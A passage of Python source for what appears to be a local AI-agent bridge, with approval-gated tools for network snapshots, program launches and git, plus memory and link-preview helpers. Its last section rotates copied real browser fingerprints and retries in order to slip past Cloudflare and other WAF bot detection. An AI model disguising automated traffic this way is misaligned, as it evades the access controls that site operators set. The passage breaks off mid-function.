        command="Get-NetTCPConnection / Get-NetUDPEndpoint / Get-DnsClientCache",
        details={"kind": "network_snapshot"},
    )
    if approval.get("decision") != "approve":
        return {"error": f"user denied snapshot ({approval.get('status')})"}

    # 2 MiB cap — busy machines easily produce >16 KiB of JSON. The model never
    # sees this raw output (only the aggregated top_processes/top_remotes), so
    # there's no context-window cost to keeping the full payload.
    res = _run_powershell(_NETSNAP_PS, timeout=20, max_stdout=2_000_000)
    raw_stdout = res.get("stdout") or ""
    raw_stderr = res.get("stderr") or ""
    ok_flag = res.get("ok")
    if not ok_flag:
        # dump everything we know about the failure so we can diagnose
        _netsnap_debug_dump(raw_stdout, raw_stderr, exit_code=res.get("returncode"), reason="powershell-not-ok")
        return {"error": (raw_stderr or raw_stdout or "snapshot failed").strip()[:400]}
    raw = raw_stdout.lstrip("\ufeff").strip()
    if not raw:
        _netsnap_debug_dump(raw_stdout, raw_stderr, exit_code=res.get("returncode"), reason="empty-stdout")
        return {"error": "empty output from PowerShell"}
    data = None
    try:
        data = json.loads(raw)
    except Exception:
        start = -1
        for k, ch in enumerate(raw):
            if ch in "{[":
                start = k
                break
        if start >= 0:
            opener = raw[start]
            closer = "}" if opener == "{" else "]"
            end = raw.rfind(closer)
            if end > start:
                candidate = raw[start:end + 1]
                try:
                    data = json.loads(candidate)
                except Exception:
                    pass
    if data is None:
        debug_path = _netsnap_debug_dump(raw_stdout, raw_stderr, exit_code=res.get("returncode"), reason="json-parse-failed")
        return {
            "error": "parse failed: no valid JSON in PowerShell output",
            "raw": raw[:600],
            "debug_dump": debug_path,
            "stderr_head": raw_stderr[:300],
        }

    tcp = data.get("tcp") or []
    udp = data.get("udp") or []
    procs = data.get("processes") or {}
    if isinstance(tcp, dict): tcp = [tcp]
    if isinstance(udp, dict): udp = [udp]

    # annotate each connection with its owning process name (or "?" if gone).
    for c in tcp:
        c["process"] = procs.get(str(c.get("OwningProcess")), "?")
    for c in udp:
        c["process"] = procs.get(str(c.get("OwningProcess")), "?")

    # group by remote endpoint so destinations with many connections rise to the top.
    from collections import Counter
    remotes = Counter()
    for c in tcp:
        addr = c.get("RemoteAddress") or ""
        port = c.get("RemotePort") or 0
        if addr and addr not in ("0.0.0.0", "::", "127.0.0.1", "::1"):
            remotes[(addr, int(port))] += 1
    top_remotes = [{"address": a, "port": p, "count": n} for (a, p), n in remotes.most_common(30)]

    # connections per process — handy for "what is svchost talking to"
    by_proc = Counter()
    for c in tcp:
        by_proc[c.get("process") or "?"] += 1
    top_procs = [{"process": k, "connections": v} for k, v in by_proc.most_common(20)]

    listeners = []
    for c in udp:
        la = c.get("LocalAddress") or ""
        if la in ("0.0.0.0", "::"):
            listeners.append(c)
    listeners = listeners[:30]

    return {
        "platform": "windows",
        "tcp_count": len(tcp),
        "udp_count": len(udp),
        "tcp_connections": tcp[:80],
        "udp_listeners": listeners,
        "top_remotes": top_remotes,
        "top_processes": top_procs,
        "recent_dns": data.get("dns_cache") or [],
    }


def tool_open_program(args: dict) -> dict:
    """Launch a program. Allowed from Program Files and user areas; blocked for Windows/System32 only."""
    path = normalize_path(args.get("path") or "")
    if not path or not os.path.exists(path):
        return {"error": f"not found: {path}"}
    if is_blocked_path(path):
        return {"error": "path blocked (Windows/System32)"}
    approval = request_approval(
        title="Launch program",
        command=f'Start-Process "{path}"',
        details={"kind": "launch", "path": path},
    )
    if approval.get("decision") != "approve":
        return {"error": f"user denied launch ({approval.get('status')})"}
    try:
        subprocess.Popen([path] + list(args.get("args", []) or []), shell=False)
        return {"ok": True, "path": path}
    except Exception as e:
        return {"error": str(e)}


# ---- git -------------------------------------------------------------------
# Wraps the `git` CLI so the model can stage, commit, push, etc. Read-only
# verbs (status/log/diff/branch/show/remote) run freely; anything that mutates
# the index, working tree, or a remote is gated through request_approval. All
# verbs run with `cwd` inside the workspace — repos outside the workspace are
# rejected the same way file edits are. GIT_TERMINAL_PROMPT=0 means a missing
# credential or a host-key prompt fails fast instead of hanging the worker.


def _resolve_git_cwd(path: str) -> tuple[str | None, dict | None]:
    """Validate `path` is inside the workspace and resolves to a directory.
    Returns (abs_dir, None) on success or (None, {"error": ...})."""
    if not path:
        return None, {"error": "path is required (directory inside the workspace)"}
    norm = normalize_path(path)
    p = Path(norm)
    if not p.exists():
        return None, {"error": f"path does not exist: {norm}"}
    if not p.is_dir():
        norm = str(p.parent)
    if is_blocked_path(norm):
        return None, {"error": "path is blocked"}
    if not is_in_workspace(norm):
        return None, {"error": "path is outside the workspace — add it via Workspace settings first"}
    return norm, None


def _git_env() -> dict:
    env = dict(os.environ)
    # Refuse to prompt for credentials / passphrases / host keys; we can't
    # answer them through a subprocess pipe and the worker would hang.
    env["GIT_TERMINAL_PROMPT"] = "0"
    env["GIT_PAGER"] = "cat"
    env["GIT_OPTIONAL_LOCKS"] = "0"
    env.setdefault("GCM_INTERACTIVE", "Never")
    return env


def _run_git(cwd: str, argv: list[str], timeout: int = 60,
             max_stdout: int = 200_000, stream_label: str = "git") -> dict:
    """Run `git <argv...>` in cwd. Streams stdout/stderr like _run_powershell."""
    try:
        proc = subprocess.Popen(
            ["git", *argv],
            cwd=cwd,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            env=_git_env(),
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
        )
    except FileNotFoundError:
        return {"error": "git is not installed or not on PATH"}
    except Exception as e:
        return {"error": str(e)}

    out_lines: list[str] = []
    err_lines: list[str] = []

    def reader(pipe, sink, label):
        try:
            for line in iter(pipe.readline, ""):
                sink.append(line)
                _emit_tool_stream(label, line.rstrip("\n\r"))
            pipe.close()
        except Exception:
            pass

    label = f"{stream_label} {argv[0]}" if argv else stream_label
    t_out = threading.Thread(target=reader, args=(proc.stdout, out_lines, label), daemon=True)
    t_err = threading.Thread(target=reader, args=(proc.stderr, err_lines, label), daemon=True)
    t_out.start(); t_err.start()

    try:
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        try:
            proc.kill()
        except Exception:
            pass
        return {"error": f"timeout after {timeout}s", "argv": argv}

    t_out.join(timeout=5); t_err.join(timeout=5)
    stdout = "".join(out_lines)[-max_stdout:]
    stderr = "".join(err_lines)[-8000:]
    return {
        "ok": proc.returncode == 0,
        "exit": proc.returncode,
        "stdout": stdout,
        "stderr": stderr,
        "argv": ["git", *argv],
        "cwd": cwd,
    }


def _git_approve(title: str, cwd: str, argv: list[str], extra: dict | None = None) -> dict | None:
    """Block on user approval. Returns None if approved, or a refusal dict."""
    # Self-protection: refuse destructive git ops that would clobber bridge.py.
    # `git checkout -- bridge.py`, `git restore bridge.py`, `git reset --hard`
    # in the accuretta repo would all wipe an in-flight edit the user is
    # actively working on. Hard refuse — bypasses approval like PowerShell does.
    head = argv[0] if argv else ""
    destructive = head in {"checkout", "restore", "reset", "clean", "rm"}
    if destructive:
        joined = " ".join(argv)
        if _PROT_BRIDGE_FILE_RE.search(joined):
            return {"error": "refused: would discard local changes to bridge.py. Stash or commit your edits first if you actually want this."}
        if head == "reset" and "--hard" in argv and _is_accuretta_repo(cwd):
            return {"error": "refused: `git reset --hard` inside the Accuretta repo would wipe uncommitted bridge edits. Stash or commit first."}
        if head == "clean" and any(a in {"-f", "-fd", "-fdx", "-fx"} for a in argv) and _is_accuretta_repo(cwd):
            return {"error": "refused: `git clean -f*` inside the Accuretta repo would delete untracked bridge files."}
    command = "git " + " ".join(shlex.quote(a) for a in argv)
    details = {"kind": "git", "cwd": cwd, "argv": argv}
    if extra:
        details.update(extra)
    approval = request_approval(title=title, command=command, details=details)
    if approval.get("decision") != "approve":
        return {"error": f"user denied git ({approval.get('status')})"}
    return None


def _is_accuretta_repo(cwd: str) -> bool:
    """True if `cwd` is inside the directory that contains the running bridge.py."""
    if not _BRIDGE_FILE_ABS:
        return False
    try:
        bridge_dir = str(Path(_BRIDGE_FILE_ABS).parent).lower()
        c = str(Path(cwd).resolve()).lower()
        return c == bridge_dir or c.startswith(bridge_dir + os.sep)
    except Exception:
        return False


def tool_git_status(args: dict) -> dict:
    cwd, err = _resolve_git_cwd(args.get("path") or "")
    if err:
        return err
    res = _run_git(cwd, ["status", "--porcelain=v1", "--branch", "--untracked-files=normal"], timeout=30)
    # Also fetch the current branch name verbatim — porcelain v1 ## line is
    # cryptic when the branch has no upstream (## main vs ## HEAD (no branch)).
    head = _run_git(cwd, ["rev-parse", "--abbrev-ref", "HEAD"], timeout=10)
    if isinstance(res, dict) and res.get("ok"):
        res["branch"] = (head.get("stdout") or "").strip() if isinstance(head, dict) else ""
    return res


def tool_git_log(args: dict) -> dict:
    cwd, err = _resolve_git_cwd(args.get("path") or "")
    if err:
        return err
    n = max(1, min(int(args.get("max_count", 20) or 20), 200))
    fmt = "%h%x09%an%x09%ad%x09%s"
    argv = ["log", f"-n{n}", "--date=short", f"--pretty=format:{fmt}"]
    ref = (args.get("ref") or "").strip()
    if ref:
        argv.append(ref)
    file_filter = (args.get("file") or "").strip()
    if file_filter:
        argv.extend(["--", file_filter])
    return _run_git(cwd, argv, timeout=30)


def tool_git_diff(args: dict) -> dict:
    cwd, err = _resolve_git_cwd(args.get("path") or "")
    if err:
        return err
    argv = ["diff", "--no-color"]
    if args.get("staged"):
        argv.append("--cached")
    if args.get("stat"):
        argv.append("--stat")
    ref = (args.get("ref") or "").strip()
    if ref:
        argv.append(ref)
    file_filter = (args.get("file") or "").strip()
    if file_filter:
        argv.extend(["--", file_filter])
    return _run_git(cwd, argv, timeout=60, max_stdout=400_000)


def tool_git_branch(args: dict) -> dict:
    cwd, err = _resolve_git_cwd(args.get("path") or "")
    if err:
        return err
    argv = ["branch", "--no-color", "-vv"]
    if args.get("all"):
        argv.append("-a")
    if args.get("remote"):
        argv.append("-r")
    return _run_git(cwd, argv, timeout=20)


def tool_git_show(args: dict) -> dict:
    cwd, err = _resolve_git_cwd(args.get("path") or "")
    if err:
        return err
    ref = (args.get("ref") or "HEAD").strip()
    argv = ["show", "--no-color", ref]
    if args.get("stat"):
        argv.append("--stat")
    return _run_git(cwd, argv, timeout=30, max_stdout=300_000)


def tool_git_remote(args: dict) -> dict:
    cwd, err = _resolve_git_cwd(args.get("path") or "")
    if err:
        return err
    return _run_git(cwd, ["remote", "-v"], timeout=15)


def tool_git_add(args: dict) -> dict:
    cwd, err = _resolve_git_cwd(args.get("path") or "")
    if err:
        return err
    paths = args.get("paths")
    if isinstance(paths, str):
        paths = [paths]
    if not paths or not isinstance(paths, list):
        if args.get("all"):
            paths = ["-A"]
        else:
            return {"error": "specify `paths` (list of files) or `all: true`"}
    # Refuse the lazy `-A` from a nested cwd unless the caller explicitly opts in.
    argv = ["add", "--", *paths] if paths != ["-A"] else ["add", "-A"]
    refusal = _git_approve(f"git add ({len(paths)} target{'s' if len(paths)!=1 else ''})", cwd, argv)
    if refusal:
        return refusal
    return _run_git(cwd, argv, timeout=60)


def tool_git_commit(args: dict) -> dict:
    cwd, err = _resolve_git_cwd(args.get("path") or "")
    if err:
        return err
    message = (args.get("message") or "").strip()
    if not message:
        return {"error": "commit message is required"}
    argv = ["commit", "-m", message]
    if args.get("amend"):
        argv.append("--amend")
        if args.get("no_edit"):
            argv.append("--no-edit")
    if args.get("allow_empty"):
        argv.append("--allow-empty")
    if args.get("all"):
        argv.append("-a")
    title = "git commit" + (" --amend" if args.get("amend") else "")
    refusal = _git_approve(title, cwd, argv, extra={"message_preview": message[:200]})
    if refusal:
        return refusal
    return _run_git(cwd, argv, timeout=60)


def tool_git_push(args: dict) -> dict:
    cwd, err = _resolve_git_cwd(args.get("path") or "")
    if err:
        return err
    argv = ["push"]
    if args.get("set_upstream"):
        argv.append("-u")
    if args.get("force_with_lease"):
        argv.append("--force-with-lease")
    if args.get("tags"):
        argv.append("--tags")
    remote = (args.get("remote") or "").strip()
    branch = (args.get("branch") or "").strip()
    if remote:
        argv.append(remote)
        if branch:
            argv.append(branch)
    elif branch:
        # branch without remote is invalid; default remote to origin
        argv.extend(["origin", branch])
    refusal = _git_approve("git push", cwd, argv)
    if refusal:
        return refusal
    # Push can be slow on a fresh clone with large history; 5 min cap.
    return _run_git(cwd, argv, timeout=300)


def tool_git_pull(args: dict) -> dict:
    cwd, err = _resolve_git_cwd(args.get("path") or "")
    if err:
        return err
    argv = ["pull"]
    if args.get("rebase"):
        argv.append("--rebase")
    if args.get("ff_only"):
        argv.append("--ff-only")
    remote = (args.get("remote") or "").strip()
    branch = (args.get("branch") or "").strip()
    if remote:
        argv.append(remote)
        if branch:
            argv.append(branch)
    refusal = _git_approve("git pull", cwd, argv)
    if refusal:
        return refusal
    return _run_git(cwd, argv, timeout=300)


def tool_git_fetch(args: dict) -> dict:
    cwd, err = _resolve_git_cwd(args.get("path") or "")
    if err:
        return err
    argv = ["fetch"]
    if args.get("all"):
        argv.append("--all")
    if args.get("prune"):
        argv.append("--prune")
    if args.get("tags"):
        argv.append("--tags")
    remote = (args.get("remote") or "").strip()
    if remote:
        argv.append(remote)
    refusal = _git_approve("git fetch", cwd, argv)
    if refusal:
        return refusal
    return _run_git(cwd, argv, timeout=180)


def tool_git_checkout(args: dict) -> dict:
    cwd, err = _resolve_git_cwd(args.get("path") or "")
    if err:
        return err
    target = (args.get("target") or "").strip()
    if not target:
        return {"error": "`target` is required (branch, ref, or '--' file)"}
    argv = ["checkout"]
    if args.get("create"):
        argv.append("-b")
    argv.append(target)
    files = args.get("files")
    if isinstance(files, str):
        files = [files]
    if files:
        argv.append("--")
        argv.extend(files)
    refusal = _git_approve("git checkout", cwd, argv)
    if refusal:
        return refusal
    return _run_git(cwd, argv, timeout=60)


def tool_git_restore(args: dict) -> dict:
    cwd, err = _resolve_git_cwd(args.get("path") or "")
    if err:
        return err
    files = args.get("files")
    if isinstance(files, str):
        files = [files]
    if not files:
        return {"error": "`files` is required (list of paths to restore)"}
    argv = ["restore"]
    if args.get("staged"):
        argv.append("--staged")
    if args.get("worktree", True) and not args.get("staged"):
        # default behavior of `git restore` is worktree; nothing to add
        pass
    if args.get("source"):
        argv.extend(["--source", str(args["source"])])
    argv.append("--")
    argv.extend(files)
    refusal = _git_approve("git restore", cwd, argv, extra={"files": files})
    if refusal:
        return refusal
    return _run_git(cwd, argv, timeout=30)


def tool_git_reset(args: dict) -> dict:
    cwd, err = _resolve_git_cwd(args.get("path") or "")
    if err:
        return err
    mode = (args.get("mode") or "mixed").strip().lower()
    if mode not in {"soft", "mixed", "hard", "keep", "merge"}:
        return {"error": "mode must be one of: soft, mixed, hard, keep, merge"}
    argv = ["reset", f"--{mode}"]
    target = (args.get("target") or "").strip()
    if target:
        argv.append(target)
    title = f"git reset --{mode}"
    refusal = _git_approve(title, cwd, argv)
    if refusal:
        return refusal
    return _run_git(cwd, argv, timeout=60)


def tool_git_init(args: dict) -> dict:
    cwd, err = _resolve_git_cwd(args.get("path") or "")
    if err:
        return err
    argv = ["init"]
    initial_branch = (args.get("initial_branch") or "").strip()
    if initial_branch:
        argv.extend(["-b", initial_branch])
    refusal = _git_approve("git init", cwd, argv)
    if refusal:
        return refusal
    return _run_git(cwd, argv, timeout=20)


def tool_git_clone(args: dict) -> dict:
    """Clone into a directory inside the workspace. `dest` must be a workspace path."""
    url = (args.get("url") or "").strip()
    if not url:
        return {"error": "`url` is required"}
    dest = (args.get("dest") or "").strip()
    if not dest:
        return {"error": "`dest` is required (directory inside workspace; will be created)"}
    dest_norm = normalize_path(dest)
    parent = str(Path(dest_norm).parent)
    if not is_in_workspace(parent):
        return {"error": "dest is outside the workspace"}
    if is_blocked_path(dest_norm):
        return {"error": "dest path is blocked"}
    if os.path.exists(dest_norm) and os.listdir(dest_norm):
        return {"error": f"dest already exists and is non-empty: {dest_norm}"}
    Path(parent).mkdir(parents=True, exist_ok=True)
    argv = ["clone", url, dest_norm]
    depth = args.get("depth")
    if depth and int(depth) > 0:
        argv.extend(["--depth", str(int(depth))])
    branch = (args.get("branch") or "").strip()
    if branch:
        argv.extend(["--branch", branch])
    refusal = _git_approve("git clone", parent, argv, extra={"url": url, "dest": dest_norm})
    if refusal:
        return refusal
    # Clone runs in the parent (cwd doesn't matter much for clone with explicit dest).
    return _run_git(parent, argv, timeout=900)


_STOPWORDS = {
    "the", "a", "an", "and", "or", "but", "if", "then", "so", "to", "of", "in", "on",
    "at", "for", "with", "by", "from", "is", "are", "was", "were", "be", "been",
    "being", "do", "does", "did", "have", "has", "had", "you", "your", "me", "my",
    "i", "we", "us", "our", "it", "its", "this", "that", "these", "those", "can",
    "could", "would", "should", "will", "just", "please", "hey", "hi", "hello",
    "some", "any", "all", "only", "also", "much", "more", "most", "very", "how",
    "what", "when", "where", "why", "which", "who", "whom", "whose", "make",
    "create", "build", "need", "want", "like", "get", "got", "put", "see", "tell",
    "say", "know", "good", "bad", "new", "old", "here", "there", "them", "now",
}


def _title_from_prompt(text: str, max_len: int = 44) -> str:
    """Produce a concise, readable chat title from the first user message.
    Grabs the most distinctive keywords; falls back to a truncation of the raw
    text if nothing useful remains after filtering."""
    if not text:
        return "new session"
    cleaned = re.sub(r"```[\s\S]*?```", " ", text)        # drop code fences
    cleaned = re.sub(r"https?://\S+", " ", cleaned)        # drop urls
    cleaned = re.sub(r"[^\w\s\-']", " ", cleaned)          # keep letters/digits
    words = [w for w in cleaned.split() if w]
    keywords: list[str] = []
    seen: set[str] = set()
    for w in words:
        lw = w.lower()
        if lw in _STOPWORDS:
            continue
        if len(lw) < 2:
            continue
        if lw in seen:
            continue
        seen.add(lw)
        keywords.append(w)
    if not keywords:
        fallback = " ".join(words[:6]) or text.strip()
        return (fallback[: max_len - 1].rstrip() + "…") if len(fallback) > max_len else fallback
    title = " ".join(keywords[:6])
    if len(title) > max_len:
        title = title[: max_len - 1].rstrip() + "…"
    return title.lower()


def _load_memories() -> list[dict]:
    if not MEMORIES_FILE.exists():
        return []
    out = []
    try:
        with MEMORIES_FILE.open("r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    out.append(json.loads(line))
                except Exception:
                    continue
    except Exception:
        return []
    return out


def _save_memories(memories: list[dict]) -> None:
    MEMORIES_FILE.parent.mkdir(parents=True, exist_ok=True)
    with MEMORIES_FILE.open("w", encoding="utf-8") as f:
        for m in memories:
            f.write(json.dumps(m, ensure_ascii=False) + "\n")


def tool_remember(args: dict) -> dict:
    """Save a terse lesson from this turn so future sessions start smarter."""
    text = (args.get("text") or "").strip()
    if not text:
        return {"error": "text required"}
    text = text[:MEMORIES_TEXT_CAP]
    tags = args.get("tags") or []
    if isinstance(tags, str):
        tags = [tags]
    tags = [str(t).strip().lower()[:24] for t in tags if str(t).strip()][:5]
    memories = _load_memories()
    # de-dupe: if an identical text already exists, bump its use_count instead of adding
    for m in memories:
        if m.get("text") == text:
            m["use_count"] = int(m.get("use_count", 0)) + 1
            m["updated"] = int(time.time())
            _save_memories(memories)
            return {"saved": False, "reason": "duplicate", "id": m.get("id"), "count": m["use_count"]}
    entry = {
        "id": uuid.uuid4().hex[:8],
        "text": text,
        "tags": tags,
        "created": int(time.time()),
        "use_count": 1,
    }
    memories.append(entry)
    # cap total at 200 entries — drop oldest unused first
    if len(memories) > 200:
        memories.sort(key=lambda m: (m.get("use_count", 0), m.get("created", 0)))
        memories = memories[-200:]
    _save_memories(memories)
    return {"saved": True, "id": entry["id"], "total": len(memories)}


def tool_forget(args: dict) -> dict:
    mid = (args.get("id") or "").strip()
    if not mid:
        return {"error": "id required"}
    memories = _load_memories()
    before = len(memories)
    memories = [m for m in memories if m.get("id") != mid]
    _save_memories(memories)
    return {"removed": before - len(memories), "total": len(memories)}


def tool_edit_memory(args: dict) -> dict:
    mid = (args.get("id") or "").strip()
    text = (args.get("text") or "").strip()
    if not mid or not text:
        return {"error": "id and text required"}
    text = text[:MEMORIES_TEXT_CAP]
    tags = args.get("tags") or []
    if isinstance(tags, str):
        tags = [tags]
    tags = [str(t).strip().lower()[:24] for t in tags if str(t).strip()][:5]
    
    memories = _load_memories()
    found = False
    for m in memories:
        if m.get("id") == mid:
            m["text"] = text
            if tags:
                m["tags"] = tags
            m["updated"] = int(time.time())
            found = True
            break
    if not found:
        return {"error": f"memory id {mid} not found"}
    _save_memories(memories)
    return {"saved": True, "id": mid}


def _select_memories_for_prompt() -> list[dict]:
    """Pick the most useful memories for the system prompt — favor recent + used."""
    memories = _load_memories()
    if not memories:
        return []
    memories.sort(
        key=lambda m: (int(m.get("use_count", 0)), int(m.get("updated", 0) or m.get("created", 0))),
        reverse=True,
    )
    return memories[:MEMORIES_MAX_INJECT]


# ---- Link preview (for clickable links in chat bubbles) ------------------
# In-process cache so repeat hovers don't re-fetch. Keyed by URL, value is the
# preview dict. Bounded by LRU-style trim to keep memory tiny — link previews
# are small (a few KB each) but a chatty session might generate hundreds.
_LINK_PREVIEW_CACHE: dict[str, dict] = {}
_LINK_PREVIEW_CACHE_LOCK = threading.Lock()
_LINK_PREVIEW_CACHE_MAX = 512


def _link_preview_extract(html: str) -> dict:
    """Pull a small set of meta tags out of HTML. Order of preference for each
    field: og:* > twitter:* > stdlib equivalents. We don't run a real parser —
    a couple of regexes are accurate enough for 99% of pages and don't bring in
    a dependency."""
    def _meta(prop_re: str) -> str:
        # match <meta property/name="X" content="Y"> in either order.
        m = re.search(
            r'<meta[^>]+(?:property|name)\s*=\s*["\']' + prop_re + r'["\'][^>]*content\s*=\s*["\']([^"\']*)["\']',
            html, flags=re.IGNORECASE,
        )
        if m:
            return m.group(1)
        m = re.search(
            r'<meta[^>]+content\s*=\s*["\']([^"\']*)["\'][^>]*(?:property|name)\s*=\s*["\']' + prop_re + r'["\']',
            html, flags=re.IGNORECASE,
        )
        return m.group(1) if m else ""

    title = (
        _meta(r"og:title")
        or _meta(r"twitter:title")
        or ""
    )
    if not title:
        m = re.search(r"<title[^>]*>([\s\S]*?)</title>", html, flags=re.IGNORECASE)
        if m:
            title = re.sub(r"\s+", " ", m.group(1)).strip()

    desc = (
        _meta(r"og:description")
        or _meta(r"twitter:description")
        or _meta(r"description")
        or ""
    )
    image = (
        _meta(r"og:image(?::secure_url)?")
        or _meta(r"twitter:image(?::src)?")
        or ""
    )
    site = (
        _meta(r"og:site_name")
        or ""
    )

    # Decode HTML entities the cheap way — these meta values are usually
    # short and safe to feed through html.unescape.
    import html as _htmllib
    return {
        "title": _htmllib.unescape(title)[:300],
        "description": _htmllib.unescape(desc)[:600],
        "image": image[:600],
        "site_name": _htmllib.unescape(site)[:120],
    }


# =====================================================================
# Outbound HTTP — believable browser identity rotation.
#
# Cloudflare, Akamai, and most modern WAFs 403 anything that smells like a
# script. Sending a single "Mozilla/5.0 ... accuretta/1.0" UA only gets us
# past the laziest filters. Below is a small pool of REAL recent browser
# fingerprints (UA + matching Sec-Ch-Ua + matching Accept-Language /
# Accept-Encoding / Sec-Fetch-* headers — every header set was captured
# from a fresh install of the corresponding browser, not stitched
# together). _pick_profile() returns one at random; _browser_headers()
# materializes it into a header dict; _open_with_rotation() handles the
# 403/429 → swap-profile-and-retry loop.
#
# This is bot-detection mitigation, not bypass. Anything fingerprinting
# TLS (JA3/JA4) or running JS challenges will still block us. It just
# raises the bar enough that a lot of "first request gets 403" cases now
# succeed on attempt 1 or 2.
# =====================================================================

# Each profile: family + ua + sec-ch-ua tuple (Chromium-only). Versions
# updated 2025-Q2 — refresh quarterly to stay current. Mix of Win/Mac
# desktop only; no mobile UAs because some sites serve a degraded m-dot
# version that breaks our HTML parsers.
_BROWSER_PROFILES = [
    {
        "family": "chrome", "platform": "Windows",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec_ch_ua_platform": '"Windows"',
    },
    {
        "family": "chrome", "platform": "macOS",
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec_ch_ua_platform": '"macOS"',
    },
    {
        "family": "chrome", "platform": "Windows",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Google Chrome";v="130", "Chromium";v="130", "Not_A Brand";v="24"',
        "sec_ch_ua_platform": '"Windows"',
    },
    {
        "family": "edge", "platform": "Windows",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
        "sec_ch_ua": '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec_ch_ua_platform": '"Windows"',
    },
    {
        "family": "edge", "platform": "Windows",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
        "sec_ch_ua": '"Microsoft Edge";v="130", "Chromium";v="130", "Not_A Brand";v="24"',
        "sec_ch_ua_platform": '"Windows"',
    },
    {
        # Firefox doesn't send Sec-Ch-Ua — leaving those keys out is the point.
        "family": "firefox", "platform": "Windows",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    },
    {
        "family": "firefox", "platform": "macOS",
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0",
    },
    {
        "family": "firefox", "platform": "Linux",
        "ua": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
    },
    {
        # Safari also doesn't send Sec-Ch-Ua, and pins Accept-Encoding to gzip.
        "family": "safari", "platform": "macOS",
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    },
    {
        "family": "safari", "platform": "macOS",
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    },
]

# Per-host stickiness — once we find a profile that works for a given host
# we keep using it for ~10 minutes so we don't re-roll the dice every
# request and spike the host's "this UA changed mid-session" alarm.
_PROFILE_LOCK = threading.Lock()
_PROFILE_BY_HOST: dict[str, tuple[dict, float]] = {}
_PROFILE_STICKY_TTL = 600.0  # seconds


def _pick_profile(host: str | None = None, exclude: dict | None = None) -> dict:
    """Pick a profile — sticky per-host when possible, random otherwise.
    `exclude` lets callers ask for *anything but this one* on retry."""
    now = time.time()
    if host:
        with _PROFILE_LOCK:
            sticky = _PROFILE_BY_HOST.get(host)
            if sticky and (now - sticky[1] < _PROFILE_STICKY_TTL) and sticky[0] is not exclude:
                return sticky[0]
    pool = [p for p in _BROWSER_PROFILES if p is not exclude] or _BROWSER_PROFILES
    return random.choice(pool)


def _remember_profile(host: str, profile: dict) -> None:
    if not host:
        return
    with _PROFILE_LOCK:
        _PROFILE_BY_HOST[host] = (profile, time.time())


def _browser_headers(profile: dict, *, referer: str | None = None,
                     accept_html: bool = True) -> dict:
    """Materialize a profile + per-request bits into a real header dict.
    Mimics what the named browser actually sends — wrong combinations
    (e.g. Firefox + Sec-Ch-Ua) are a known fingerprint tell, so we only
    add Sec-Ch-Ua headers for Chromium families."""
    h: dict[str, str] = {
        "User-Agent": profile["ua"],
        "Accept": (
            "text/html,application/xhtml+xml,application/xml;q=0.9,"
            "image/avif,image/webp,image/apng,*/*;q=0.8"
        ) if accept_html else "*/*",
        "Accept-Language": random.choice([
            "en-US,en;q=0.9",
            "en-US,en;q=0.5",
            "en-GB,en;q=0.9",
            "en-US,en;q=0.8,fr;q=0.5",
        ]),
        # urllib does NOT auto-decompress, so we DON'T advertise gzip/br
        # — otherwise we'd get binary garbage back. Identity-only here.
        "Accept-Encoding": "identity",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site" if referer else "none",
        "Sec-Fetch-User": "?1",
        "Connection": "keep-alive",
    }
    if referer:
        h["Referer"] = referer
    if profile["family"] in ("chrome", "edge"):
        h["Sec-Ch-Ua"] = profile["sec_ch_ua"]
        h["Sec-Ch-Ua-Mobile"] = "?0"
        h["Sec-Ch-Ua-Platform"] = profile["sec_ch_ua_platform"]
    return h


def _open_with_rotation(url: str, *, timeout: float = 15.0,
                        max_bytes: int = 1024 * 1024,
                        attempts: int = 3,
                        accept_html: bool = True,
                        referer: str | None = None,
                        method: str | None = None,
                        data: bytes | None = None,
                        extra_headers: dict | None = None):
    """Fetch a URL with browser-identity rotation + 403/429 retry.

    Returns a tuple (status, content_type, raw_bytes, profile_used). Raises
    on the *final* attempt's exception — earlier failures are swallowed
    and re-tried with a fresh profile + small jittered backoff.

    Per-host stickiness: once a profile works for a host, we reuse it for
    `_PROFILE_STICKY_TTL` seconds. That keeps requests looking like one
    user instead of "the user's UA changed three times in a row."
    """
    try:
        host = urllib.parse.urlparse(url).netloc
    except Exception:
        host = ""

    last_exc: Exception | None = None
    tried: list[dict] = []
    for attempt in range(max(1, attempts)):
        profile = _pick_profile(host, exclude=tried[-1] if tried else None)
        tried.append(profile)
        headers = _browser_headers(profile, referer=referer, accept_html=accept_html)
        if extra_headers:
            headers.update(extra_headers)
        try:
            req = urllib.request.Request(url, data=data, method=method, headers=headers)
